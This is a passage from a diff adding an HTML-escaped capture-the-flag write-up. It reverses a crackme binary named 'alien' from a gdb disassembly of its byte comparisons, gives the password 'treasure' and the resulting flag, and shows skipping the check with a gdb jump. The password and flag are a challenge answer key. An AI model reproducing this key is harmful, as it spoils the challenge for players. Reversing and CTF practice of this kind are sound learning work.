+&lt;span class=&quot;mh&quot;&gt;0x00000000000009ff&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;lt;+&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;224&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;gt;:&lt;/span&gt;	&lt;span class=&quot;k&quot;&gt;mov&lt;/span&gt;    &lt;span class=&quot;n&quot;&gt;rax&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;QWORD&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;PTR&lt;/span&gt; &lt;span class=&quot;err&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;rbp&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;mh&quot;&gt;0x10&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;]&lt;/span&gt;
+&lt;span class=&quot;mh&quot;&gt;0x0000000000000a03&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;lt;+&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;228&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;gt;:&lt;/span&gt;	&lt;span class=&quot;k&quot;&gt;add&lt;/span&gt;    &lt;span class=&quot;n&quot;&gt;rax&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;mh&quot;&gt;0x8&lt;/span&gt;
+&lt;span class=&quot;mh&quot;&gt;0x0000000000000a07&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;lt;+&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;232&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;gt;:&lt;/span&gt;	&lt;span class=&quot;k&quot;&gt;mov&lt;/span&gt;    &lt;span class=&quot;n&quot;&gt;rax&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;QWORD&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;PTR&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;[rax]&lt;/span&gt;
+&lt;span class=&quot;mh&quot;&gt;0x0000000000000a0a&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;lt;+&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;235&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;gt;:&lt;/span&gt;	&lt;span class=&quot;k&quot;&gt;movzx&lt;/span&gt;  &lt;span class=&quot;n&quot;&gt;eax&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;BYTE&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;PTR&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;[rax]&lt;/span&gt;
+&lt;span class=&quot;mh&quot;&gt;0x0000000000000a0d&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;lt;+&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;238&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;gt;:&lt;/span&gt;	&lt;span class=&quot;k&quot;&gt;cmp&lt;/span&gt;    &lt;span class=&quot;n&quot;&gt;al&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;mh&quot;&gt;0x74&lt;/span&gt;
+&lt;span class=&quot;mh&quot;&gt;0x0000000000000a0f&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;lt;+&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;240&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;gt;:&lt;/span&gt;	&lt;span class=&quot;k&quot;&gt;jne&lt;/span&gt;    &lt;span class=&quot;mh&quot;&gt;0xa4e&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;main&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;+&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;303&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt;
+&lt;span class=&quot;mh&quot;&gt;0x0000000000000a11&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;lt;+&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;242&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;gt;:&lt;/span&gt;	&lt;span class=&quot;k&quot;&gt;mov&lt;/span&gt;    &lt;span class=&quot;n&quot;&gt;rax&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;QWORD&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;PTR&lt;/span&gt; &lt;span class=&quot;err&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;rbp&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;mh&quot;&gt;0x10&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;]&lt;/span&gt;
+&lt;span class=&quot;mh&quot;&gt;0x0000000000000a15&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;lt;+&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;246&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;gt;:&lt;/span&gt;	&lt;span class=&quot;k&quot;&gt;add&lt;/span&gt;    &lt;span class=&quot;n&quot;&gt;rax&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;mh&quot;&gt;0x8&lt;/span&gt;
+&lt;span class=&quot;mh&quot;&gt;0x0000000000000a19&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;lt;+&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;250&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;gt;:&lt;/span&gt;	&lt;span class=&quot;k&quot;&gt;mov&lt;/span&gt;    &lt;span class=&quot;n&quot;&gt;rax&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;QWORD&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;PTR&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;[rax]&lt;/span&gt;
+&lt;span class=&quot;mh&quot;&gt;0x0000000000000a1c&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;lt;+&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;253&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;gt;:&lt;/span&gt;	&lt;span class=&quot;k&quot;&gt;add&lt;/span&gt;    &lt;span class=&quot;n&quot;&gt;rax&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;mh&quot;&gt;0x7&lt;/span&gt;
+&lt;span class=&quot;mh&quot;&gt;0x0000000000000a20&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;lt;+&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;257&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;gt;:&lt;/span&gt;	&lt;span class=&quot;k&quot;&gt;movzx&lt;/span&gt;  &lt;span class=&quot;n&quot;&gt;eax&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;BYTE&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;PTR&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;[rax]&lt;/span&gt;
+&lt;span class=&quot;mh&quot;&gt;0x0000000000000a23&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;lt;+&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;260&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;gt;:&lt;/span&gt;	&lt;span class=&quot;k&quot;&gt;cmp&lt;/span&gt;    &lt;span class=&quot;n&quot;&gt;al&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;mh&quot;&gt;0x65&lt;/span&gt;
+&lt;span class=&quot;mh&quot;&gt;0x0000000000000a25&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;lt;+&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;262&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;gt;:&lt;/span&gt;	&lt;span class=&quot;k&quot;&gt;jne&lt;/span&gt;    &lt;span class=&quot;mh&quot;&gt;0xa4e&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;main&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;+&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;303&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt;
+&lt;span class=&quot;mh&quot;&gt;0x0000000000000a27&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;lt;+&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;264&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;gt;:&lt;/span&gt;	&lt;span class=&quot;k&quot;&gt;mov&lt;/span&gt;    &lt;span class=&quot;n&quot;&gt;rax&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;QWORD&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;PTR&lt;/span&gt; &lt;span class=&quot;err&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;rbp&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;mh&quot;&gt;0x10&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;]&lt;/span&gt;
+&lt;span class=&quot;mh&quot;&gt;0x0000000000000a2b&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;lt;+&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;268&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;gt;:&lt;/span&gt;	&lt;span class=&quot;k&quot;&gt;add&lt;/span&gt;    &lt;span class=&quot;n&quot;&gt;rax&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;mh&quot;&gt;0x8&lt;/span&gt;
+&lt;span class=&quot;mh&quot;&gt;0x0000000000000a2f&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;lt;+&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;272&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;gt;:&lt;/span&gt;	&lt;span class=&quot;k&quot;&gt;mov&lt;/span&gt;    &lt;span class=&quot;n&quot;&gt;rax&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;QWORD&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;PTR&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;[rax]&lt;/span&gt;
+&lt;span class=&quot;mh&quot;&gt;0x0000000000000a32&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;lt;+&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;275&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;gt;:&lt;/span&gt;	&lt;span class=&quot;k&quot;&gt;add&lt;/span&gt;    &lt;span class=&quot;n&quot;&gt;rax&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;mh&quot;&gt;0x3&lt;/span&gt;
+&lt;span class=&quot;mh&quot;&gt;0x0000000000000a36&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;lt;+&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;279&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;gt;:&lt;/span&gt;	&lt;span class=&quot;k&quot;&gt;movzx&lt;/span&gt;  &lt;span class=&quot;n&quot;&gt;eax&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;BYTE&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;PTR&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;[rax]&lt;/span&gt;
+&lt;span class=&quot;mh&quot;&gt;0x0000000000000a39&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;lt;+&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;282&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;gt;:&lt;/span&gt;	&lt;span class=&quot;k&quot;&gt;cmp&lt;/span&gt;    &lt;span class=&quot;n&quot;&gt;al&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;mh&quot;&gt;0x61&lt;/span&gt;
+&lt;span class=&quot;mh&quot;&gt;0x0000000000000a3b&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;lt;+&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;284&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;gt;:&lt;/span&gt;	&lt;span class=&quot;k&quot;&gt;jne&lt;/span&gt;    &lt;span class=&quot;mh&quot;&gt;0xa4e&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;main&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;+&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;303&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt;
+&lt;span class=&quot;mh&quot;&gt;0x0000000000000a3d&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;lt;+&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;286&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;gt;:&lt;/span&gt;	&lt;span class=&quot;k&quot;&gt;mov&lt;/span&gt;    &lt;span class=&quot;n&quot;&gt;eax&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;mh&quot;&gt;0x0&lt;/span&gt;
+&lt;span class=&quot;mh&quot;&gt;0x0000000000000a42&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;lt;+&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;291&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;gt;:&lt;/span&gt;	&lt;span class=&quot;k&quot;&gt;call&lt;/span&gt;   &lt;span class=&quot;mh&quot;&gt;0x74a&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;my_open&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt;
+&lt;span class=&quot;mh&quot;&gt;0x0000000000000a47&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;lt;+&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;296&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;gt;:&lt;/span&gt;	&lt;span class=&quot;k&quot;&gt;mov&lt;/span&gt;    &lt;span class=&quot;n&quot;&gt;eax&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;mh&quot;&gt;0x0&lt;/span&gt;
+&lt;span class=&quot;mh&quot;&gt;0x0000000000000a4c&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;lt;+&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;301&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;gt;:&lt;/span&gt;	&lt;span class=&quot;k&quot;&gt;jmp&lt;/span&gt;    &lt;span class=&quot;mh&quot;&gt;0xa8c&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;main&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;+&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;365&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt;
+&lt;span class=&quot;mh&quot;&gt;0x0000000000000a4e&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;lt;+&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;303&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;gt;:&lt;/span&gt;	&lt;span class=&quot;k&quot;&gt;mov&lt;/span&gt;    &lt;span class=&quot;n&quot;&gt;edx&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;mh&quot;&gt;0x8&lt;/span&gt;
+&lt;span class=&quot;mh&quot;&gt;0x0000000000000a53&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;lt;+&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;308&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;gt;:&lt;/span&gt;	&lt;span class=&quot;k&quot;&gt;lea&lt;/span&gt;    &lt;span class=&quot;n&quot;&gt;rsi&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;rip&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;+&lt;/span&gt;&lt;span class=&quot;mh&quot;&gt;0x127&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;]&lt;/span&gt;        &lt;span class=&quot;err&quot;&gt;#&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0xb81&lt;/span&gt;
+&lt;span class=&quot;mh&quot;&gt;0x0000000000000a5a&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;lt;+&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;315&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;gt;:&lt;/span&gt;	&lt;span class=&quot;k&quot;&gt;mov&lt;/span&gt;    &lt;span class=&quot;n&quot;&gt;edi&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;mh&quot;&gt;0x1&lt;/span&gt;
+&lt;span class=&quot;mh&quot;&gt;0x0000000000000a5f&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;lt;+&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;320&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;gt;:&lt;/span&gt;	&lt;span class=&quot;k&quot;&gt;call&lt;/span&gt;   &lt;span class=&quot;mh&quot;&gt;0x600&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;write&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;@&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;plt&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt;
+&lt;span class=&quot;mh&quot;&gt;0x0000000000000a64&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;lt;+&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;325&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;gt;:&lt;/span&gt;	&lt;span class=&quot;k&quot;&gt;mov&lt;/span&gt;    &lt;span class=&quot;n&quot;&gt;eax&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;mh&quot;&gt;0xffffffff&lt;/span&gt;
+&lt;span class=&quot;mh&quot;&gt;0x0000000000000a69&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;lt;+&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;330&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;gt;:&lt;/span&gt;	&lt;span class=&quot;k&quot;&gt;jmp&lt;/span&gt;    &lt;span class=&quot;mh&quot;&gt;0xa8c&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;main&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;+&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;365&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt;
+&lt;span class=&quot;mh&quot;&gt;0x0000000000000a6b&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;lt;+&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;332&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;gt;:&lt;/span&gt;	&lt;span class=&quot;k&quot;&gt;cmp&lt;/span&gt;    &lt;span class=&quot;n&quot;&gt;DWORD&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;PTR&lt;/span&gt; &lt;span class=&quot;err&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;rbp&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;mh&quot;&gt;0x4&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;]&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;mh&quot;&gt;0x2&lt;/span&gt;
+&lt;span class=&quot;mh&quot;&gt;0x0000000000000a6f&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;lt;+&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;336&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;gt;:&lt;/span&gt;	&lt;span class=&quot;k&quot;&gt;jle&lt;/span&gt;    &lt;span class=&quot;mh&quot;&gt;0xa87&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;main&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;+&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;360&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt;
+&lt;span class=&quot;mh&quot;&gt;0x0000000000000a71&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;lt;+&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;338&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;gt;:&lt;/span&gt;	&lt;span class=&quot;k&quot;&gt;mov&lt;/span&gt;    &lt;span class=&quot;n&quot;&gt;edx&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;mh&quot;&gt;0x12&lt;/span&gt;
+&lt;span class=&quot;mh&quot;&gt;0x0000000000000a76&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;lt;+&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;343&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;gt;:&lt;/span&gt;	&lt;span class=&quot;k&quot;&gt;lea&lt;/span&gt;    &lt;span class=&quot;n&quot;&gt;rsi&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;rip&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;+&lt;/span&gt;&lt;span class=&quot;mh&quot;&gt;0x10d&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;]&lt;/span&gt;        &lt;span class=&quot;err&quot;&gt;#&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0xb8a&lt;/span&gt;
+&lt;span class=&quot;mh&quot;&gt;0x0000000000000a7d&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;lt;+&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;350&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;gt;:&lt;/span&gt;	&lt;span class=&quot;k&quot;&gt;mov&lt;/span&gt;    &lt;span class=&quot;n&quot;&gt;edi&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;mh&quot;&gt;0x1&lt;/span&gt;
+&lt;span class=&quot;mh&quot;&gt;0x0000000000000a82&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;lt;+&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;355&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;gt;:&lt;/span&gt;	&lt;span class=&quot;k&quot;&gt;call&lt;/span&gt;   &lt;span class=&quot;mh&quot;&gt;0x600&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;write&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;@&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;plt&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt;
+&lt;span class=&quot;mh&quot;&gt;0x0000000000000a87&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;lt;+&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;360&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;gt;:&lt;/span&gt;	&lt;span class=&quot;k&quot;&gt;mov&lt;/span&gt;    &lt;span class=&quot;n&quot;&gt;eax&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;mh&quot;&gt;0x0&lt;/span&gt;
+&lt;span class=&quot;mh&quot;&gt;0x0000000000000a8c&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;lt;+&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;365&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;gt;:&lt;/span&gt;	&lt;span class=&quot;k&quot;&gt;leave&lt;/span&gt;  
+&lt;span class=&quot;mh&quot;&gt;0x0000000000000a8d&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;lt;+&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;366&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;gt;:&lt;/span&gt;	&lt;span class=&quot;k&quot;&gt;ret&lt;/span&gt;    
+&lt;span class=&quot;n&quot;&gt;End&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;of&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;assembler&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;dump&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;It seems to be a conditional series to success to get the flag. The following conditions are the one to respect to get the flag:&lt;/p&gt;
+
+&lt;ol&gt;
+  &lt;li&gt;The argument must have a lenght of 8 bytes.&lt;/li&gt;
+  &lt;li&gt;The third bytes must be equal to 0x65 (‘e’).&lt;/li&gt;
+  &lt;li&gt;The fifth bytes must be equal to 0x73 (‘s’).&lt;/li&gt;
+  &lt;li&gt;The second bytes must be equal to 0x72 (‘r’).&lt;/li&gt;
+  &lt;li&gt;The seventh bytes must be equal to 0x72 (‘r’).&lt;/li&gt;
+  &lt;li&gt;The first bytes must be equal to 0x74 (‘t’).&lt;/li&gt;
+  &lt;li&gt;The eighth bytes must be equal to 0x65 (‘e’).&lt;/li&gt;
+  &lt;li&gt;The fourth bytes must be equal must be equal to 0x61 (‘a’).&lt;/li&gt;
+&lt;/ol&gt;
+
+&lt;p&gt;All the condition make the word “treasure”. Go to test it:&lt;/p&gt;
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;./alien treasure                      
+Well &lt;span class=&quot;k&quot;&gt;done&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;!&lt;/span&gt; Validate the chall with : flag&lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;S0_U_R_A_2000_k1dd1E?&lt;span class=&quot;o&quot;&gt;}&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;You can also easily validate the chall with a jump into the “my_open” function while debugging the binary: (be attention at the PIE protection)&lt;/p&gt;
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;gdb &lt;span class=&quot;nt&quot;&gt;-q&lt;/span&gt; ./alien 
+Reading symbols from ./alien...&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;no debugging symbols found&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;...done.
+
+gdb-peda&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;br main
+Breakpoint 1 at 0x923
+
+gdb-peda&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;r
+Starting program: /home/meffre_q/Downloads/alien
+...
+Breakpoint 1, 0x0000555555554923 &lt;span class=&quot;k&quot;&gt;in &lt;/span&gt;main &lt;span class=&quot;o&quot;&gt;()&lt;/span&gt;
+
+gdb-peda&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;jump my_open 
+Continuing at 0x55555555474e.
